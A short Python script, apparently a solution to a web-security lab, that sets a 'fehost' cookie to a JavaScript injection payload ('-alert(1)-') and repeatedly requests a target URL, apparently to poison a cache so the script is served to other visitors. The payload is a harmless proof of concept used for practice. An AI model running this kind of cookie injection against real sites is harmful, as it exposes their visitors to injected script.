import time
from urllib.parse import quote
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

cookie = 'someString"-alert(1)-"someString'
burp_cookies = {"fehost": quote(cookie)}
#response = requests.get(my_acc, cookies=burp_cookies)

print("wait 30sek")
for _ in range(30):
        response = requests.get(burp_url, cookies=burp_cookies)
        time.sleep(1)
